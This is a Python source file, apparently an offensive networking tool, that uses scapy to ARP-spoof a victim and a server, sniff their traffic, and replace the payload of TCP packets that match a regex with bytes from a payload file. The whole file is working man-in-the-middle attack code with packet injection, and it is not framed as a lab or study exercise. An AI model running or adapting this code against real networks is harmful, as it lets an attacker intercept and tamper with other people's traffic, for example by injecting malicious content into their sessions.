import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ARP, Ether, IP, TCP, Raw, send, sendp, sniff, srp
import os, sys
import threading
import time
from termcolor import colored
from RegexModule import RegexModule



# Function to automatically retrieve MAC addresses
def get_mac_address(ip):
    # Packet crafting
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request = ARP(pdst=ip)
    full_packet = broadcast/arp_request

    # Getting response
    answer = srp(full_packet, verbose=False)[0]
    mac_address = answer[0][1].hwsrc
    return mac_address



# Function to perform ARP spoofing
def arp_spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

# Function to restore original ARP tables
def restore_arp(target_ip, target_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False)



# Function to execute ARP spoofing in a loop
def mitm(victim_ip, victim_mac, server_ip, server_mac, stop_event):
    while not stop_event.is_set():
        arp_spoof(victim_ip, victim_mac, server_ip)
        arp_spoof(server_ip, server_mac, victim_ip)
        time.sleep(2)
    restore_arp(victim_ip, victim_mac, server_ip, server_mac)
    restore_arp(server_ip, server_mac, victim_ip, victim_mac)
    print(colored("\n[ARP SPOOFER]: ARP tables restored. Exiting.", 'light_cyan'))



# Function to modify intercepted TCP packets based on regex and payload
def modify_packet(packet, interface, payload, validator):
    if packet.haslayer(TCP):      

        # Modify the TCP packet if Raw data is present
        if packet.haslayer(Raw):
            original_payload = packet[Raw].load
            match_result = validator.test_match(original_payload.decode(errors='ignore'))

            if match_result:
                print(colored(f"[MATCHER]: match found. Replacing \n{original_payload}\nwith\n{payload}", 'green'))
                packet[Raw].load = payload

                # Recalculate necessary fields
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum

                # Send modified packet
                sendp(packet, iface=interface, verbose=False)
                print(colored(f"[SENDER]: modified TCP packet sent.", 'light_cyan'))
            else:
                # Send unmodified packet
                sendp(packet, iface=interface, verbose=False)



# Function to handle the main program logic
def tool_exec(victim_ip, server_ip, interface, rule_file, payload_file):

    ################## STEP 1: configuration files ###################
    current_directory = os.path.dirname(os.path.abspath(__file__))
    config_directory = os.path.join(current_directory, '..', 'config')
    config_directory = os.path.normpath(config_directory)

    if rule_file == '../config/rule.txt':
        rule_file = f"{config_directory}/rule.txt"
    
    if payload_file == '../config/payload.txt':
        payload_file = f"{config_directory}/payload.txt"


    #################### STEP 2: regex validation ####################
    with open(rule_file, 'r') as rf:
        rule = rf.read().strip()
    regex_validator = RegexModule(rule)
    if not regex_validator.is_valid():
        print(colored("[REGEX MODULE]: invalid regex pattern.", 'red'))
        exit(1)
    else:
        print(colored("[REGEX MODULE]: valid regex pattern.", 'green'))


    #################### STEP 3: read payload file ####################
    with open(payload_file, 'rb') as pf:
        payload = pf.read()
        print(colored("[PAYLOAD READER]: payload read.", 'green'))


    #################### STEP 4: retrieve MAC addresses ####################
    # Victim
    print(colored(f"[MAC RETRIVER]: retriving MAC address for victim {victim_ip}.", 'yellow'))
    victim_mac = get_mac_address(victim_ip)
    print(colored(f"[MAC RETRIVER]: got {victim_mac}.", 'green'))

    # Server
    print(colored(f"[MAC RETRIVER]: retriving MAC address for server {server_ip}.", 'yellow'))
    server_mac = get_mac_address(server_ip)
    print(colored(f"[MAC RETRIVER]: got {server_mac}.", 'green'))


    #################### STEP 5: start MITM attack ####################
    # Create a stop Event to control Thread execution
    stop_event = threading.Event()

    # Start ARP spoofing in a separate thread
    thread = threading.Thread(target=mitm, args=(victim_ip, victim_mac, server_ip, server_mac, stop_event))
    thread.start()

    try:
        # Start sniffing the network
        print(colored("[SNIFFER]: start sniffing", 'yellow'))
        sniff(iface=interface, prn=lambda packet: modify_packet(packet, interface, payload, regex_validator))
    except KeyboardInterrupt:
        stop_event.set()
        thread.join()
        return
